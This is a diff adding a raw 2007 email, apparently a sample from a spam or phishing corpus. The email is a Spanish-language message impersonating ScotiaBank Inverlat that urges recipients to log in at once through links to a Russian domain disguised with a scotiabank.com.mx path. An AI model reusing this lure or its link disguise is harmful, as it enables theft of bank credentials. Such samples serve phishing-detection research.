@@ -1,0 +1,74 @@
+From nobody Sun Jan 25 13:50:01 2015
+Return-Path: <admin@scotiabank.com.mx>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 25F5E468EB
+ for <user@login.example.com>; Tue, 30 Jan 2007 06:19:48 -0500 (EST)
+Received: from lujan.uninet.edu (bio.hgy.es [193.146.180.21])
+ by mail.example.org (Postfix) with ESMTP id 804D7131FA42
+ for <user@example.com>; Tue, 30 Jan 2007 06:19:47 -0500 (EST)
+Received: by lujan.uninet.edu (Postfix)
+ id A45501C273; Tue, 30 Jan 2007 12:19:44 +0100 (CET)
+Delivered-To: umeet@uninet.edu
+Received: from mar.uninet.edu (mar.uninet.edu [193.146.180.108])
+ by lujan.uninet.edu (Postfix) with ESMTP id 693A21BEF4
+ for <umeet@uninet.edu>; Tue, 30 Jan 2007 12:19:44 +0100 (CET)
+Received: from localhost (localhost [127.0.0.1])
+ by mar.uninet.edu (Postfix) with ESMTP id 5A916743
+ for <umeet@uninet.edu>; Tue, 30 Jan 2007 12:19:44 +0100 (CET)
+Received: from lujan.uninet.edu ([193.146.180.21])
+ by localhost (mar [193.146.180.108]) (amavisd-new, port 10024)
+ with ESMTP id 07478-05 for <umeet@uninet.edu>;
+ Tue, 30 Jan 2007 12:19:32 +0100 (CET)
+Received: from ns1.dpdigital.net (ns1.dpdigital.net [67.15.127.23])
+ by lujan.uninet.edu (Postfix) with ESMTP id 4A3B01BCBD
+ for <umeet@uninet.edu>; Tue, 30 Jan 2007 12:19:18 +0100 (CET)
+X-ClientAddr: 127.0.0.1
+Received: from www.priisa.info (localhost.localdomain [127.0.0.1])
+ by ns1.dpdigital.net (8.13.1/8.13.1) with ESMTP id l0UBJCg9004537
+ for <umeet@uninet.edu>; Tue, 30 Jan 2007 05:19:14 -0600
+Date: Tue, 30 Jan 2007 05:19:12 -0600
+To: "umeet@uninet.edur" <umeet@uninet.edu>
+From: =?iso-8859-1?Q?ScotiaBank_Depto=2E_de_Administraci=F3n=2E?=
+ <admin@scotiabank.com.mx>
+Subject: =?iso-8859-1?Q?Solicitud_de_actualizaci=F3n_de_datos_de_su_cuenta_de_Scot?=
+ =?iso-8859-1?Q?iaBank.?=
+Message-ID: <2beb301574271934e674290f97872eab@www.priisa.info>
+X-Priority: 3
+X-Mailer: PHPMailer [version 1.72]
+MIME-Version: 1.0
+Content-Transfer-Encoding: 8bit
+Content-Type: text/html; charset="iso-8859-1"
+X-SUDIRECCION-MailScanner-Information: Please contact the ISP for more
+ information
+X-SUDIRECCION-MailScanner: Found to be clean
+X-MailScanner-From: admin@scotiabank.com.mx
+X-Virus-Scanned: by amavisd-new-20030616-p10 at uninet.edu
+X-Spam-Status: Yes, hits=10.9 tagged_above=0.0 required=5.0 tests=BAYES_00,
+ HTML_50_60, HTML_IMAGE_ONLY_16, HTML_MESSAGE, HTML_MIME_NO_HTML_TAG,
+ HTML_SHOUTING3, MIME_HTML_ONLY, RAZOR2_CF_RANGE_51_100, RAZOR2_CHECK
+X-Spam-Level: **********
+X-Spam-Flag: YES
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 716
+
+<table width=640 border=0 align=center cellpadding=0 cellspacing=0>
+  <tr>
+    <td><p><img src="http://www.scotiabankinverlat.com/ScotiaCms/Templates/images/logo.gif" width=225 height=33></p>
+      <p><strong><font face="Verdana, Arial, Helvetica, sans-serif" size=2 color="#FF0000">ESTIMADO CLIENTE</font></strong></p>
+      <p><strong><font face="Verdana, Arial, Helvetica, sans-serif" size=2>ScotiaBank Inverlat</strong> le comunica a todos  nuestros clientes que nuestros servidores de procesos bancarios han sido  actualizados y ya estan operativos.</p>
+      <p>Sin embargo, debido a la creciente cantidad del uso de Internet como medio de pago seguro, nos vemos en la obligación de  pedirle su colaboración para una rápida restauración de los datos en las nuevas  plataformas.</p>
+      <p>Si no ha ingresado en su cuenta bancaria en las últimas 24 horas, le rogamos lo haga de inmediato para evitar  cualquier anomalía, ya que pueden haber errores en los datos de su estado de cuenta.</p>
+      <p>Ingrese a nuestro portal electrónico seleccionando su tipo de cuenta bancaria:<br><br><strong><center><h2>
+    <a href="http://www.loza-mebel.ru/pic/www.scotiabank.com.mx/Personas/index.htm">Personal</a> -
+<a href="http://www.loza-mebel.ru/pic/www.scotiabank.com.mx/Personas/index.htm">Empresarial</a></center></h2></strong>
+<br><br>Gracias por su atención.<br>
+<center>
+<img src="http://www.scotiabankinverlat.com/ScotiaCms/Templates/images/marca_reg.gif" width="136" height="15"></center>
+</td>
+  </tr>
+</table>
+
